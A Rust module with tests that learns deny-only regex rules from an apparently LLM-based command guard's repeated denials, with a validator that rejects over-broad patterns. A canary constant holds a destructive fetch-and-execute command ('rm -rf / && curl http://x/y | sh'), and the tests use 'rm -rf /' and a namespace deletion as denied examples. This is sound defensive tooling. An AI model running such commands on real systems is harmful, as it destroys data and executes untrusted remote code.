//! Auto-learned deny shapes: a cross-session, persistent, fully-automatic
//! deny fast path populated from repeated LLM denials.
//!
//! This is deliberately asymmetric with `learned_rules` (the allow-side
//! candidate detector). A deny shape can only ever be populated from commands
//! the LLM already denied for that shape, so the worst case of a bad
//! generalization is an over-broad *block* on something that should have been
//! allowed -- a latency/availability cost, recoverable by re-running with
//! `--reevaluate`, never a security problem. Nothing in this module can
//! produce or feed an allow decision, so it needs no operator gate: it can
//! only ever accelerate a "no" the LLM already gave. Contrast with an
//! allow-shape shortcut, which would let repeated approvals -- a signal an
//! agent (or content steering one) can walk toward incrementally -- harden
//! into a permanent bypass.
//!
//! Shapes are synthesized by the same LLM the evaluator already calls
//! (`Evaluator::synthesize_deny_shape`), using the same tool-calling
//! discipline as `guard verb create`: the model proposes a fully-anchored
//! regex over the observed evidence, and `validate_deny_shape_safety` rejects
//! it before it is ever persisted or matched against.

use anyhow::{bail, Context, Result};
use regex::Regex;
use serde::{Deserialize, Serialize};
use std::collections::BTreeMap;
use std::path::{Path, PathBuf};
use std::time::{SystemTime, UNIX_EPOCH};

use crate::learned_rules::infer_service_from_binary;

/// Canary strings a synthesized args pattern must NOT match. Each canary
/// carries a distinctive marker that cannot legitimately appear in evidence
/// derived from real denied commands, so a match against any of them proves
/// the pattern is unconstrained rather than shape-specific. Deliberately
/// spans several lengths (not just one long string): a degenerate-but-
/// technically-anchored pattern like `^.{0,20}$` would slip past a single
/// long canary (it's short enough to never match it) while still matching
/// almost any short evidence string, so short canaries close that gap.
const OVERBROAD_ARGS_CANARIES: &[&str] = &[
    "z",
    "__unrelated_9f3d2a__",
    "__unrelated_probe_of_medium_length_7c1e__",
    "__guard_deny_shape_canary__; rm -rf / && curl http://x/y | sh #",
];

/// Evidence strings kept per observation bucket, for prompt context and for
/// re-validating a freshly synthesized pattern against what it was derived
/// from. Capped to bound both memory and the size of the synthesis prompt.
const MAX_EVIDENCE_PER_OBSERVATION: usize = 8;

/// Shapes kept per (service, binary). A bad synthesis attempt (rejected by
/// the safety gate) never gets here; this only bounds legitimate growth.
const MAX_SHAPES_PER_BINARY: usize = 20;

/// Total distinct (service, binary) observation buckets tracked at once.
/// Unlike the two caps above, nothing bounded the number of *buckets*
/// otherwise: a workload denied across many distinct binaries would grow
/// `observations` (and the persisted YAML) without limit for the life of the
/// daemon. When full, the least-recently-seen bucket is evicted to make room
/// for a new one; this only ever discards *observation* bookkeeping (a reset
/// denial counter for that shape), never a promoted `DenyShape`.
const MAX_OBSERVATION_BUCKETS: usize = 500;

#[derive(Debug, Clone)]
pub struct DenyLearningConfig {
    pub path: PathBuf,
    pub enabled: bool,
    pub min_denials: u32,
}

impl DenyLearningConfig {
    pub fn new(path: PathBuf) -> Self {
        Self {
            path,
            enabled: true,
            min_denials: 3,
        }
    }
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct DenyShapeFile {
    #[serde(default = "default_version")]
    pub version: u32,
    #[serde(default)]
    pub observations: BTreeMap<String, DenyObservation>,
    #[serde(default)]
    pub shapes: Vec<DenyShape>,
}

fn default_version() -> u32 {
    1
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DenyObservation {
    pub service: String,
    pub binary: String,
    #[serde(default)]
    pub evidence_args: Vec<String>,
    pub denials: u32,
    pub first_seen_unix: u64,
    pub last_seen_unix: u64,
    pub last_command: String,
    pub last_reason: String,
    /// Denial count at which synthesis was last attempted, so a threshold
    /// crossing doesn't re-trigger the LLM on every subsequent denial.
    #[serde(default)]
    pub last_attempt_at_denials: u32,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DenyShape {
    pub service: String,
    pub binary: String,
    /// Fully anchored regex (`^...$`) over the space-joined argument string.
    pub args_pattern: String,
    pub denials: u32,
    pub synthesized_at_unix: u64,
    pub updated_at_unix: u64,
    pub last_reason: String,
    pub evidence: String,
}

impl DenyShape {
    fn matches(&self, binary: &str, args_joined: &str) -> bool {
        if !binary_matches(binary, &self.binary) {
            return false;
        }
        Regex::new(&self.args_pattern)
            .map(|re| re.is_match(args_joined))
            .unwrap_or(false)
    }
}

/// Binary-name match consistent with `server::binary_allowed`: a path-qualified
/// binary (containing `/` or `\`) requires an exact match (so `/tmp/evil/kubectl`
/// cannot fast-deny under a shape learned from bare `kubectl` denials, or vice
/// versa); a bare name matches case-insensitively by basename with a stripped
/// `.exe` suffix.
fn binary_matches(observed: &str, learned: &str) -> bool {
    if observed.contains('/')
        || observed.contains('\\')
        || learned.contains('/')
        || learned.contains('\\')
    {
        return observed == learned;
    }
    binary_match_key(observed) == binary_match_key(learned)
}

fn binary_match_key(binary: &str) -> String {
    let base = binary.rsplit(['/', '\\']).next().unwrap_or(binary);
    let base = base
        .strip_suffix(".exe")
        .or_else(|| base.strip_suffix(".EXE"))
        .unwrap_or(base);
    base.to_ascii_lowercase()
}

/// Outcome of recording one LLM denial. Mirrors `learned_rules::LearningOutcome`
/// in shape, but `ready_to_synthesize` drives automatic action (a synthesis
/// attempt), not an operator-facing notice.
#[derive(Debug, Clone)]
pub struct DenyLearningOutcome {
    pub service: String,
    pub binary: String,
    pub denials: u32,
    pub required_denials: u32,
    pub ready_to_synthesize: bool,
    pub evidence_args: Vec<String>,
    pub reason: String,
}

#[derive(Debug, Clone)]
pub struct DenyShapeStore {
    config: DenyLearningConfig,
    data: DenyShapeFile,
}

impl DenyShapeStore {
    pub fn load(config: DenyLearningConfig) -> Result<Self> {
        let data = if config.path.exists() {
            let content = std::fs::read_to_string(&config.path)
                .with_context(|| format!("failed to read {}", config.path.display()))?;
            if content.trim().is_empty() {
                DenyShapeFile::default()
            } else {
                serde_yaml::from_str(&content)
                    .with_context(|| format!("failed to parse {}", config.path.display()))?
            }
        } else {
            DenyShapeFile::default()
        };
        Ok(Self { config, data })
    }

    pub fn path(&self) -> &Path {
        &self.config.path
    }

    pub fn enabled(&self) -> bool {
        self.config.enabled
    }

    pub fn min_denials(&self) -> u32 {
        self.config.min_denials
    }

    pub fn shape_count(&self) -> usize {
        self.data.shapes.len()
    }

    pub fn observation_count(&self) -> usize {
        self.data.observations.len()
    }

    /// Fast-path lookup: does an already-synthesized shape cover this
    /// binary/args? `args_joined` must be built the same way the evaluator
    /// splits a flattened command line (space-joined argv tail).
    ///
    /// Deliberately unconditional: this does not check `self.config.enabled`.
    /// `enabled` only gates whether new shapes get learned (`record_denial`);
    /// a daemon that wants `--no-learn-deny` to also stop enforcing shapes
    /// already on disk must not construct a `DenyShapeStore` for the
    /// evaluator at all (see `main.rs`, which only calls `EvalConfig::deny_shapes`
    /// when the flag is on).
    pub fn matches(&self, binary: &str, args_joined: &str) -> Option<&DenyShape> {
        self.data
            .shapes
            .iter()
            .find(|shape| shape.matches(binary, args_joined))
    }

    /// Bookkeeping only: record one LLM denial and report whether this bucket
    /// just became (re-)eligible for a synthesis attempt. Never grants or
    /// matches anything itself -- see `matches` and `promote_shape`.
    pub fn record_denial(
        &mut self,
        binary: &str,
        args: &[String],
        command: &str,
        reason: &str,
    ) -> Result<Option<DenyLearningOutcome>> {
        if !self.config.enabled {
            return Ok(None);
        }
        let service = infer_service_from_binary(binary);
        let args_joined = args.join(" ");
        let now = now_unix();
        let key = format!("{service}|{binary}");
        if !self.data.observations.contains_key(&key)
            && self.data.observations.len() >= MAX_OBSERVATION_BUCKETS
        {
            if let Some(oldest_key) = self
                .data
                .observations
                .iter()
                .min_by_key(|(_, obs)| obs.last_seen_unix)
                .map(|(k, _)| k.clone())
            {
                self.data.observations.remove(&oldest_key);
            }
        }
        let observation = self
            .data
            .observations
            .entry(key)
            .or_insert_with(|| DenyObservation {
                service: service.clone(),
                binary: binary.to_string(),
                evidence_args: Vec::new(),
                denials: 0,
                first_seen_unix: now,
                last_seen_unix: now,
                last_command: command.to_string(),
                last_reason: reason.to_string(),
                last_attempt_at_denials: 0,
            });

        observation.denials = observation.denials.saturating_add(1);
        observation.last_seen_unix = now;
        observation.last_command = command.to_string();
        observation.last_reason = reason.to_string();
        if !observation.evidence_args.contains(&args_joined)
            && observation.evidence_args.len() < MAX_EVIDENCE_PER_OBSERVATION
        {
            observation.evidence_args.push(args_joined);
        }

        let denials = observation.denials;
        let min_denials = self.config.min_denials;
        // Attempt synthesis on the crossing, then again every `min_denials`
        // denials after that (a first attempt can fail or come back
        // unconfident; don't hammer the LLM on every single subsequent
        // denial once the threshold is already crossed).
        let ready_to_synthesize = denials >= min_denials
            && (denials - min_denials).is_multiple_of(min_denials.max(1))
            && observation.last_attempt_at_denials != denials;
        if ready_to_synthesize {
            observation.last_attempt_at_denials = denials;
        }
        let evidence_args = observation.evidence_args.clone();

        self.save()?;
        Ok(Some(DenyLearningOutcome {
            service,
            binary: binary.to_string(),
            denials,
            required_denials: min_denials,
            ready_to_synthesize,
            evidence_args,
            reason: reason.to_string(),
        }))
    }

    /// Validate and persist a model-proposed shape. The caller (the
    /// evaluator's `synthesize_deny_shape`) has already made the LLM call;
    /// this is the only place a shape becomes matchable, and it re-derives
    /// every safety property from scratch rather than trusting the model.
    pub fn promote_shape(
        &mut self,
        service: &str,
        binary: &str,
        args_pattern: &str,
        evidence: &[String],
        reason: &str,
        denials: u32,
    ) -> Result<()> {
        validate_deny_shape_safety(args_pattern, evidence)?;
        let now = now_unix();
        if let Some(existing) = self
            .data
            .shapes
            .iter_mut()
            .find(|s| s.binary.eq_ignore_ascii_case(binary) && s.args_pattern == args_pattern)
        {
            existing.denials = denials;
            existing.updated_at_unix = now;
            existing.last_reason = reason.to_string();
        } else {
            let per_binary = self
                .data
                .shapes
                .iter()
                .filter(|s| s.binary.eq_ignore_ascii_case(binary))
                .count();
            if per_binary >= MAX_SHAPES_PER_BINARY {
                bail!(
                    "already have {} auto-learned deny shapes for binary '{}'; refusing to add more \
                     (an operator-authored deny in policy.yaml scales better than more shapes)",
                    MAX_SHAPES_PER_BINARY,
                    binary
                );
            }
            self.data.shapes.push(DenyShape {
                service: service.to_string(),
                binary: binary.to_string(),
                args_pattern: args_pattern.to_string(),
                denials,
                synthesized_at_unix: now,
                updated_at_unix: now,
                last_reason: reason.to_string(),
                evidence: evidence.join(" | "),
            });
        }
        self.save()
    }

    fn save(&self) -> Result<()> {
        if let Some(parent) = self.config.path.parent() {
            std::fs::create_dir_all(parent)
                .with_context(|| format!("failed to create {}", parent.display()))?;
        }
        let content = serde_yaml::to_string(&self.data)?;
        std::fs::write(&self.config.path, content)
            .with_context(|| format!("failed to write {}", self.config.path.display()))
    }
}

/// Reject a synthesized args pattern that isn't anchored, doesn't compile,
/// doesn't match its own evidence, or is loose enough to match
/// shell-injection-shaped content regardless of the shape it claims to
/// represent.
pub fn validate_deny_shape_safety(args_pattern: &str, evidence: &[String]) -> Result<()> {
    if !args_pattern.starts_with('^') || !args_pattern.ends_with('$') {
        bail!(
            "deny shape args pattern {:?} must be fully anchored (^...$)",
            args_pattern
        );
    }
    let re = Regex::new(args_pattern).with_context(|| {
        format!(
            "deny shape args pattern {:?} does not compile",
            args_pattern
        )
    })?;
    if let Some(canary) = OVERBROAD_ARGS_CANARIES.iter().find(|c| re.is_match(c)) {
        bail!(
            "deny shape args pattern {:?} is too permissive (it matches unrelated content {:?}); \
             refusing to auto-synthesize",
            args_pattern,
            canary
        );
    }
    for ev in evidence {
        if !re.is_match(ev) {
            bail!(
                "deny shape args pattern {:?} does not match its own evidence {:?}; refusing to \
                 auto-synthesize",
                args_pattern,
                ev
            );
        }
    }
    Ok(())
}

/// Split a flattened `binary arg1 arg2 ...` command line the same way
/// `server::command_line` joins it, so the deny-shape matcher and the
/// synthesizer see the same (binary, args_joined) split the rest of the
/// codebase uses.
pub fn split_command_line(command: &str) -> (&str, &str) {
    match command.find(char::is_whitespace) {
        Some(idx) => (&command[..idx], command[idx..].trim_start()),
        None => (command, ""),
    }
}

fn now_unix() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|duration| duration.as_secs())
        .unwrap_or(0)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn config(path: PathBuf, min_denials: u32) -> DenyLearningConfig {
        DenyLearningConfig {
            path,
            enabled: true,
            min_denials,
        }
    }

    #[test]
    fn repeated_denials_become_ready_to_synthesize_once() {
        let temp = tempfile::tempdir().unwrap();
        let mut store = DenyShapeStore::load(config(temp.path().join("deny.yaml"), 2)).unwrap();
        let args = vec!["delete".into(), "namespace".into(), "prod".into()];

        let first = store
            .record_denial("kubectl", &args, "kubectl delete namespace prod", "risky")
            .unwrap()
            .unwrap();
        assert!(!first.ready_to_synthesize);

        let second = store
            .record_denial("kubectl", &args, "kubectl delete namespace prod", "risky")
            .unwrap()
            .unwrap();
        assert!(second.ready_to_synthesize);

        // A third denial before the next multiple of min_denials should not
        // re-trigger synthesis.
        let third = store
            .record_denial("kubectl", &args, "kubectl delete namespace prod", "risky")
            .unwrap()
            .unwrap();
        assert!(!third.ready_to_synthesize);

        // The fourth denial (min_denials=2) is the next actual multiple and
        // should re-trigger synthesis: an unconfident/failed first attempt
        // must not permanently disable a shape from ever being retried.
        let fourth = store
            .record_denial("kubectl", &args, "kubectl delete namespace prod", "risky")
            .unwrap()
            .unwrap();
        assert!(fourth.ready_to_synthesize);
    }

    #[test]
    fn disabled_store_records_nothing() {
        let temp = tempfile::tempdir().unwrap();
        let mut cfg = config(temp.path().join("deny.yaml"), 1);
        cfg.enabled = false;
        let mut store = DenyShapeStore::load(cfg).unwrap();
        let result = store
            .record_denial("rm", &["-rf".into(), "/".into()], "rm -rf /", "bad")
            .unwrap();
        assert!(result.is_none());
    }

    #[test]
    fn promoted_shape_matches_binary_and_args() {
        let temp = tempfile::tempdir().unwrap();
        let mut store = DenyShapeStore::load(config(temp.path().join("deny.yaml"), 2)).unwrap();
        store
            .promote_shape(
                "kubectl",
                "kubectl",
                r"^delete namespace \S+$",
                &["delete namespace prod".to_string()],
                "namespace deletion is destructive",
                2,
            )
            .unwrap();

        assert!(store.matches("kubectl", "delete namespace prod").is_some());
        assert!(store
            .matches("kubectl", "delete namespace staging")
            .is_some());
        assert!(store.matches("kubectl", "get pods").is_none());
        assert!(store.matches("helm", "delete namespace prod").is_none());
    }

    #[test]
    fn matches_rejects_path_qualified_spoof_like_binary_allowed_does() {
        // Consistent with server::binary_allowed: a shape learned against the
        // bare binary name must not match a path-qualified spoof, and vice
        // versa -- deny-only, so this isn't an exploitable bypass, but it
        // should behave the same way the codebase's other binary matching does.
        let temp = tempfile::tempdir().unwrap();
        let mut store = DenyShapeStore::load(config(temp.path().join("deny.yaml"), 2)).unwrap();
        store
            .promote_shape(
                "kubectl",
                "kubectl",
                r"^delete namespace \S+$",
                &["delete namespace prod".to_string()],
                "namespace deletion is destructive",
                2,
            )
            .unwrap();

        assert!(store.matches("kubectl", "delete namespace prod").is_some());
        assert!(store
            .matches("/tmp/evil/kubectl", "delete namespace prod")
            .is_none());
        assert!(store
            .matches("KUBECTL.EXE", "delete namespace prod")
            .is_some());
    }

    #[test]
    fn promote_shape_rejects_degenerate_short_wildcard_pattern() {
        // A pattern like `^.{0,20}$` is anchored, compiles, and (being short)
        // never matches the long shell-injection canary -- but it would still
        // match almost any short evidence string. Multiple canary lengths
        // close this gap.
        let temp = tempfile::tempdir().unwrap();
        let mut store = DenyShapeStore::load(config(temp.path().join("deny.yaml"), 2)).unwrap();
        let err = store
            .promote_shape(
                "kubectl",
                "kubectl",
                r"^.{0,20}$",
                &["delete ns prod".to_string()],
                "reason",
                2,
            )
            .unwrap_err();
        assert!(err.to_string().contains("too permissive"));
    }

    #[test]
    fn promote_shape_rejects_unanchored_pattern() {
        let temp = tempfile::tempdir().unwrap();
        let mut store = DenyShapeStore::load(config(temp.path().join("deny.yaml"), 2)).unwrap();
        let err = store
            .promote_shape(
                "kubectl",
                "kubectl",
                r"delete namespace \S+",
                &["delete namespace prod".to_string()],
                "reason",
                2,
            )
            .unwrap_err();
        assert!(err.to_string().contains("anchored"));
    }

    #[test]
    fn promote_shape_rejects_overbroad_pattern() {
        let temp = tempfile::tempdir().unwrap();
        let mut store = DenyShapeStore::load(config(temp.path().join("deny.yaml"), 2)).unwrap();
        let err = store
            .promote_shape(
                "kubectl",
                "kubectl",
                r"^.*$",
                &["delete namespace prod".to_string()],
                "reason",
                2,
            )
            .unwrap_err();
        assert!(err.to_string().contains("too permissive"));
    }

    #[test]
    fn promote_shape_rejects_pattern_that_does_not_match_its_own_evidence() {
        let temp = tempfile::tempdir().unwrap();
        let mut store = DenyShapeStore::load(config(temp.path().join("deny.yaml"), 2)).unwrap();
        let err = store
            .promote_shape(
                "kubectl",
                "kubectl",
                r"^delete namespace staging$",
                &["delete namespace prod".to_string()],
                "reason",
                2,
            )
            .unwrap_err();
        assert!(err.to_string().contains("does not match its own evidence"));
    }

    #[test]
    fn split_command_line_handles_no_args() {
        assert_eq!(split_command_line("ls"), ("ls", ""));
        assert_eq!(
            split_command_line("kubectl delete pod foo"),
            ("kubectl", "delete pod foo")
        );
    }

    #[test]
    fn observation_buckets_are_capped_by_evicting_the_oldest() {
        let temp = tempfile::tempdir().unwrap();
        let mut store = DenyShapeStore::load(config(temp.path().join("deny.yaml"), 2)).unwrap();

        // Fill directly to the cap (bypassing record_denial's per-call file
        // save so the test stays fast), each with a distinct last_seen_unix
        // so eviction order is deterministic.
        for i in 0..MAX_OBSERVATION_BUCKETS {
            store.data.observations.insert(
                format!("service-{i}|bin-{i}"),
                DenyObservation {
                    service: format!("service-{i}"),
                    binary: format!("bin-{i}"),
                    evidence_args: Vec::new(),
                    denials: 1,
                    first_seen_unix: i as u64,
                    last_seen_unix: i as u64,
                    last_command: String::new(),
                    last_reason: String::new(),
                    last_attempt_at_denials: 0,
                },
            );
        }
        assert_eq!(store.observation_count(), MAX_OBSERVATION_BUCKETS);

        // One more, previously-unseen bucket must evict the oldest
        // (last_seen_unix == 0, i.e. "service-0|bin-0") rather than growing
        // past the cap.
        store
            .record_denial("brand-new-bin", &["x".into()], "brand-new-bin x", "new")
            .unwrap();
        assert_eq!(store.observation_count(), MAX_OBSERVATION_BUCKETS);
        assert!(!store.data.observations.contains_key("service-0|bin-0"));
    }

    #[test]
    fn deny_shape_store_never_exposes_an_allow_path() {
        // Structural guarantee, not a runtime check: DenyShapeStore's only
        // public read methods are `matches` (-> Option<&DenyShape>, used
        // solely to fast-reject) and accessors for counts/config. There is
        // no method anywhere in this module that returns or implies an
        // allow decision.
        let temp = tempfile::tempdir().unwrap();
        let store = DenyShapeStore::load(config(temp.path().join("deny.yaml"), 2)).unwrap();
        assert_eq!(store.shape_count(), 0);
    }
}
